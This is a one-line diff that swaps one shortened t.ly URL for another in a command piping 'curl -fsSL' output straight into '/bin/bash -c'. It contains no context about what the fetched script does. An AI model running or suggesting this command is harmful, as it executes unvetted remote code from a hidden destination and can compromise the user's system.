@@ -1,1 +1,1 @@
-/bin/bash -c "$(curl -fsSL https://t.ly/rl1_)"
+/bin/bash -c "$(curl -fsSL t.ly/wd_5 )"
